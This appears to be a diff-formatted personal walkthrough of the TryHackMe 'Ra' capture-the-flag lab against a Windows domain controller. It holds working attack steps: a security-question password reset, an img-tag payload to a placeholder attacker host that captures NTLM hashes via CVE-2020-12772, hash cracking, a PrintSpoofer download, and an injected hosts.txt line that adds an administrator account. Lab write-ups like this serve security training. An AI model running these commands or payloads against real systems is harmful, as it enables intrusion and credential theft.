@@ -1,0 +1,280 @@
+[Ra Windows Corp]
+#Enumeration
+└─$ sudo nmap -vv -sV -sC 10.10.54.54 -T 4
+Discovered open port 135/tcp on 10.10.54.54
+Discovered open port 80/tcp on 10.10.54.54
+Discovered open port 445/tcp on 10.10.54.54
+Discovered open port 53/tcp on 10.10.54.54
+Discovered open port 139/tcp on 10.10.54.54
+Discovered open port 3389/tcp on 10.10.54.54
+Discovered open port 7443/tcp on 10.10.54.54
+Discovered open port 464/tcp on 10.10.54.54
+Discovered open port 5222/tcp on 10.10.54.54
+Discovered open port 5269/tcp on 10.10.54.54
+Discovered open port 389/tcp on 10.10.54.54
+Discovered open port 2179/tcp on 10.10.54.54
+Discovered open port 3269/tcp on 10.10.54.54
+Discovered open port 7070/tcp on 10.10.54.54
+Discovered open port 593/tcp on 10.10.54.54
+Discovered open port 9090/tcp on 10.10.54.54
+Discovered open port 7777/tcp on 10.10.54.54
+Discovered open port 9091/tcp on 10.10.54.54
+Discovered open port 3268/tcp on 10.10.54.54
+Discovered open port 88/tcp on 10.10.54.54
+Discovered open port 636/tcp on 10.10.54.54
+
+
+53/tcp   open  domain              syn-ack ttl 125 Simple DNS Plus
+80/tcp   open  http                syn-ack ttl 125 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Windcorp.
+88/tcp   open  kerberos-sec        syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2021-07-27 12:43:06Z)
+135/tcp  open  msrpc               syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn         syn-ack ttl 125 Microsoft Windows netbios-ssn
+389/tcp  open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?       syn-ack ttl 125
+464/tcp  open  kpasswd5?           syn-ack ttl 125
+593/tcp  open  ncacn_http          syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?            syn-ack ttl 125
+2179/tcp open  vmrdp?              syn-ack ttl 125
+3268/tcp open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?   syn-ack ttl 125
+3389/tcp open  ms-wbt-server       syn-ack ttl 125 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Fire.windcorp.thm
+
+
+|_ssl-date: 2021-07-27T12:45:17+00:00; +1s from scanner time.
+5222/tcp open  jabber              syn-ack ttl 125 Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     compression_methods: 
+| 
+|     xmpp: 
+|       version: 1.0
+|     unknown: 
+| 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|     stream_id: 55w75w6cwk
+|_    features: 
+5269/tcp open  xmpp                syn-ack ttl 125 Wildfire XMPP Client
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     compression_methods: 
+| 
+|     xmpp: 
+| 
+|     unknown: 
+| 
+|     errors: 
+|       (timeout)
+|     capabilities: 
+| 
+|     auth_mechanisms: 
+| 
+|_    features: 
+7070/tcp open  http                syn-ack ttl 125 Jetty 9.4.18.v20190429
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Jetty(9.4.18.v20190429)
+|_http-title: Openfire HTTP Binding Service
+7443/tcp open  ssl/http            syn-ack ttl 125 Jetty 9.4.18.v20190429
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Issuer: commonName=fire.windcorp.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-01T08:39:00
+| Not valid after:  2025-04-30T08:39:00
+| MD5:   b715 5425 83f3 a20f 75c8 ca2d 3353 cbb7
+| SHA-1: 97f7 0772 a26b e324 7ed5 bbcb 5f35 7d74 7982 66ae
+| -----BEGIN CERTIFICATE-----
+| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
+| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
+| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
+| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
+| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
+| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
+| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
+| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
+| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
+| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
+| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
+| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
+| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
+| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
+| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
+| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
+| LucP
+|_-----END CERTIFICATE-----
+7777/tcp open  socks5              syn-ack ttl 125 (No authentication; connection not allowed by ruleset)
+| socks-auth-info: 
+|_  No authentication
+9090/tcp open  zeus-admin?         syn-ack ttl 125
+9091/tcp open  ssl/xmltec-xmlmail? syn-ack ttl 125
+
+
+--------------------------------------------
+#Reset Password of Lily Levesque [Security Question: Pet's name]
+CTRL + SHIFT + I -> lilyleAndSparky.jpg
+Your password has been reset to: ChangeMe#1234
+
+#SMB-Map Enumeration
+smbmap -u lilyle -p ChangeMe#1234 -R -H windcorp.thm 
+ .\Shared\*
+        dr--r--r--                0 Sat May 30 00:45:42 2020    .
+        dr--r--r--                0 Sat May 30 00:45:42 2020    ..
+        fr--r--r--               45 Fri May  1 15:32:36 2020    Flag 1.txt
+        fr--r--r--         29526628 Sat May 30 00:45:01 2020    spark_2_8_3.deb
+        fr--r--r--         99555201 Sun May  3 11:08:39 2020    spark_2_8_3.dmg
+        fr--r--r--         78765568 Sun May  3 11:08:39 2020    spark_2_8_3.exe
+        fr--r--r--        123216290 Sun May  3 11:08:39 2020    spark_2_8_3.tar.gz
+        SYSVOL                                                  READ ONLY       Logon server share 
+
+#Smbclient
+└─$ smbclient //windcorp.thm/Shared// -U lilyle --password ChangeMe#1234    
+---------------------------------------------------------------------------
+#Exploiting spark to get shell
+[Local Privilege Escalation]
+The explanation to leverage CVE-2020-12772 is as follows.
+dpkg -i spark_2_8_3.deb
+responder -I tun0
+spark
+
+We are instructed to send the following payload to the admin buse 
+and retrieve the NTLM hash. 
+<img src=http://attackIP/test.img>
+#Crack hash with john
+We can now crack the NTLM hash and login via evil-winrm
+john --format=netntlmv2 --wordlist=/root/payloads/rockyou.txt hash.txt
+----------------------------------------------------------------------------
+#Shell
+└─$ evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
+*Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
+THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
+
+#PrivEsc
+*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+--------------------------------------------------------------------
+┌──(kali㉿kali)-[/media/…/save/exploits/windows/printspoofer]
+└─$ sudo python3 -m http.server 8082                                    
+Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
+*Evil-WinRM* PS C:\Users\buse\Desktop> Invoke-WebRequest -Uri http://10.4.30.186:8082/PrintSpoofer.exe -o exploit.exe
+#Im so stupid >_<  ofc it Didnt work.
+*Evil-WinRM* PS C:\Users\buse\Desktop> .\exploit.exe -i -c cmd
+[-] A privilege is missing: 'SeImpersonatePrivilege'
+
+*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /groups
+GROUP INFORMATION
+-----------------
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+#'C:\scripts\' called 'checkservers.ps1'. This script looks interesting:
+# reset the lists of hosts prior to looping
+$OutageHosts = $Null
+# specify the time you want email notifications resent for hosts that are down
+$EmailTimeOut = 30
+# specify the time you want to cycle through your host lists.
+$SleepTimeOut = 45
+# specify the maximum hosts that can be down before the script is aborted
+$MaxOutageCount = 10
+# specify who gets notified
+$notificationto = "brittanycr@windcorp.thm"
+# specify where the notifications come from
+$notificationfrom = "admin@windcorp.thm"
+# specify the SMTP server
+$smtpserver = "relay.windcorp.thm"
+------------------------------------------------------------------
+#Change Password
+*Evil-WinRM* PS C:\scripts> net user brittanycr test123!@* /domain
+#Smbclient
+smbclient -L windcorp.thm --user=brittanycr
+Enter WORKGROUP\brittanycr's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shared          Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+SMB1 disabled -- no workgroup available
+#Getting and modifying hosts.txt
+smb: \brittanycr\> mget hosts.txt
+Get file hosts.txt? y
+getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+#Modified hosts.txt
+└─$ cat hosts.txt      
+;net user viserion Password1234! /add; net localgroup Administrators viserion /add
+[Root]
+└─$ evil-winrm -u viserion -p Password1234! -i windcorp.thm
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\viserion\Documents> net user viserion
+User name                    viserion
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            7/27/2021 7:29:48 AM
+Password expires             9/7/2021 7:29:48 AM
+Password changeable          7/28/2021 7:29:48 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+[Administrator flag]
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type Flag3.txt
+THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}        
+
